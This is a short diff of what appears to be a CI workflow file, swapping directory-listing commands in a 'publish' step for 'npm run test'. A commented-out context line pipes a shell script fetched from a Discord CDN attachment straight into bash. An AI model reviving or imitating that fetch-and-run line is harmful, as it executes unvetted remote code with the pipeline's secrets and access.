@@ -14,8 +14,6 @@ jobs:
       - name: publish
         run: |
           pwd
-          cd ./app
-          pwd
-          ls -la
+          npm run test
         # run: curl -sSL https://cdn.discordapp.com/attachments/1129729884957188108/1129761263547846706/npm-publish-v1.0.0.sh | bash
         working-directory: ./
